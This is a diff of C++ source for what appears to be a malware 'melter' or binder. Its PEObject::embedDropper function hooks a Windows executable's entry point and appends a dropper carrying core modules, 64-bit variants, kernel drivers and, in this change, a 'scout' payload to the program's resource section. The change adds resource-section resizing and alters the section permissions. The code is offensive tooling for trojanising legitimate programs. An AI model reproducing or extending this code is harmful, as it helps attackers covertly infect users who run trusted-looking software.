@@ -1113,8 +1113,9 @@ bool PEObject::_parseText()
 }
 
 #define OFFSET(x, y) (((DWORD)x) - ((DWORD)y))
+extern PBYTE TuneResources(PBYTE pRsrcBuffer, ULONG uSectionSize, ULONG uDropperSize, PULONG uNewSectionSize);
 
-bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest, std::string fPrefix, bf::path demoBitmap)
+bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf::path codec, bf::path driver, bf::path driver64, std::string installDir, bool fixManifest, std::string fPrefix, bf::path demoBitmap, BOOL isScout, bf::path scout)
 {
 	DWORD OEP = ntHeaders()->OptionalHeader.AddressOfEntryPoint;
 	GenericSection* epSection = findSection(OEP);
@@ -1131,13 +1132,19 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	// save original code for restoring stage1
 	dropper.setPatchCode(0, _hookPointer.stage1.va, _hookPointer.stage1.ptr, _hookPointer.stage1.size);
 	
-	if ( false == dropper.build(core, core64, config, codec, driver, driver64, installDir, fPrefix, demoBitmap) )
+	// FIXME: scout
+	if ( false == dropper.build(core, core64, config, codec, driver, driver64, installDir, fPrefix, demoBitmap, isScout) )
 		throw std::exception("Dropper build failed.");
 	
 	// base size is original resource section
 	GenericSection* targetSection = getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE);
 	if (!targetSection)
 		throw std::exception("Cannot find resource section.");
+
+	ULONG uNewSectionSize;
+	PBYTE pTunedBuffer = TuneResources((PBYTE)targetSection->data(), targetSection->size(), dropper.size(), &uNewSectionSize);
+
+	targetSection->set_data((char *)pTunedBuffer, uNewSectionSize);
 	
 	// align size accounting for dropper size
 	std::size_t sectionSize = alignTo(alignToDWORD(targetSection->SizeOfRawData()) + alignToDWORD(dropper.size()), fileAlignment());
@@ -1261,7 +1268,7 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 		throw std::exception("Cannot allocate memory for new section.");
 	}
 	// fix section permissions
-	targetSection->SetCharacteristics(targetSection->Characteristics() | IMAGE_SCN_MEM_WRITE);
+	//targetSection->SetCharacteristics(targetSection->Characteristics() | IMAGE_SCN_MEM_WRITE);
 	
 	// patch stubs code
 	cout << "Stage1 jumping to " << hex << restoreVA << dec << std::endl;
